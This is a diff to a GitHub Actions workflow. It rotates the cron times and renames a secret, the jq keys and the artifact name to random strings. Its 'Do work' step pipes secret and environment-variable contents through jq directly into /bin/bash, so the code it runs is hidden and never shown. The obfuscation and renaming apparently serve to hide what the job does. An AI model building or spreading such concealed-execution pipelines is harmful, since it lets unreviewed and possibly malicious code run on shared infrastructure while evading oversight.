@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '16 4,10,16,22 * * *'
+    - cron: '28 5,11,17,23 * * *'
 jobs:
   launch:
     runs-on: ubuntu-latest
@@ -15,17 +15,17 @@ jobs:
           fetch-depth: 1
       - name: Do work
         env:
-          pit7: ${{ secrets.pit7 }}
+          ubxs4797: ${{ secrets.ubxs4797 }}
         run: |
-          printf '%s' "$pit7" | jq -r .gejm56383 | /bin/bash
-          echo $u388 | jq -r .xfd71 | /bin/bash
-          printf '%s' "$vepq59080" | jq -r .gs34 | /bin/bash
-          echo $e502 | jq -r .e0616 | /bin/bash
-          printf '%s' "$bhrt87642" | jq -r .zv276 | /bin/bash
+          printf '%s' "$ubxs4797" | jq -r .rpxbk728 | /bin/bash
+          echo $hub531 | jq -r .ppf7788 | /bin/bash
+          echo $odwx3796 | jq -r .qbmpp7436 | /bin/bash
+          echo $jops8684 | jq -r .jlax84843 | /bin/bash
+          printf '%s' "$wpq43502" | jq -r .bcan133 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
         with:
-          name: U20zAJ7B
+          name: AiMYK1K5
           path: "*.zip"
           retention-days: 1
